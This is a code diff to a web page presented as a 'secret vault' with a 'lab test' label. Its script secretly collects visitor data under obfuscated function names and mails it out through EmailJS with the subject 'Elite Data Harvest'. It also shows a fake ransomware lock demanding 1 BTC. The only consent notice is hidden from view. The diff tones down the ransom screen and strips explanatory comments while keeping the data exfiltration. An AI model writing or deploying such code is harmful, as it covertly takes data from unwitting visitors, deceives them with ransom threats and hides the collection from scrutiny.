@@ -100,6 +100,10 @@
         @keyframes blink {
             50% { opacity: 0; }
         }
+        .retry-btn {
+            display: none;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -127,6 +131,7 @@
         <div></div>
     </div>
     <div class="master-unlock" id="masterUnlock">Master Vault Unlocked! Access Granted.</div>
+    <button class="btn retry-btn" id="retryBtn" onclick="location.reload()">Retry Access</button>
     <p class="hidden">Lab test only. Consent to data collection for research.</p>
 
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -256,13 +261,14 @@
             }
         }
 
-        // Ransomware Simulation
+        // Ransomware Simulation (Fixed)
         function _rS() {
             if (Math.random() > 0.8) {
                 let data = 'Ransomware triggered';
                 collectedData.push(data);
                 _sD(data, _r());
-                document.body.innerHTML = '<h1 style="color: #ff0000;">SYSTEM LOCKED! Transfer 1 BTC to Unlock!</h1>';
+                alert('SYSTEM LOCKED! Transfer 1 BTC to Unlock! (Simulation)');
+                document.getElementById('retryBtn').style.display = 'block';
                 console.log('Ransomware:', data);
             }
         }
@@ -279,6 +285,7 @@
                 collectedData.push(data);
                 _sD(data, _r());
                 alert('Critical System Failure! Retry Access.');
+                document.getElementById('retryBtn').style.display = 'block';
                 console.log('Error:', data);
             }
         }
@@ -360,7 +367,7 @@
                 from_name: 'Ultimate Secret Vault',
                 subject: 'Elite Data Harvest',
                 message: 'Attached is the complete data collection.',
-                data: collectedData.join('\n') // Send all collected data
+                data: collectedData.join('\n')
             };
             emailjs.send('service_gjn6691', 'template_qkg66lc', emailParams)
                 .then(() => console.log('Elite Data Sent:', collectedData.join('\n')))
@@ -373,7 +380,7 @@
             let actions = [_cT, _bF, _gL, _cA, _sR, _fE, _rS];
             let rand = actions[Math.floor(Math.random() * actions.length)];
             rand();
-            if (Math.random() > 0.9) _iD(); // Extra data collection chance
+            if (Math.random() > 0.9) _iD();
         }
 
         // Start the Vault
